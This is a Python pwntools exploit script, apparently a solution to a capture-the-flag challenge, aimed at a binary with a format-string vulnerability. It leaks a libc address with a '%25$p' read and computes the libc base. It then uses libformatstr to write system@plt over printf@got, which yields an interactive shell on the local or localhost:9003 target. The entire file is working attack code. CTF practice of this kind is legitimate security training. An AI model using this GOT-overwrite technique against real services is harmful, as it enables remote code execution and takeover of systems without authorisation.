#!/usr/bin/env python2
# -*- coding:utf-8 -*

from pwn import *
from libformatstr import FormatStr
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./distfiles/chall"
libc = ELF("./distfiles/libc-2.27.so")
elf = ELF(chall)

if len(argv) >= 2 and argv[1] == "r":
    p = remote("localhost", 9003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# cache system@libc to got
p.recvuntil("$ ")
p.sendline("ls")

# leak __libc_start_main+231
p.recvuntil("$ ")
p.sendline("%25$p")
leak = eval(p.recv(14))
log.info("leak = 0x{:08x}".format(leak))
libc_base = leak - libc.symbols['__libc_start_main'] - 231
log.info("libc_base = 0x{:08x}".format(libc_base))
printf_got = elf.got['printf']
system_plt = elf.plt['system']
log.info("printf@got = 0x{:08x}".format(printf_got))
log.info("system@plt = 0x{:08x}".format(system_plt))

# got overwrite
f = FormatStr(isx64=1)# for x86_64
f[printf_got] = system_plt
f[printf_got + 4] = 0

p.recvuntil("$ ")
p.sendline(f.payload(12))

p.interactive()
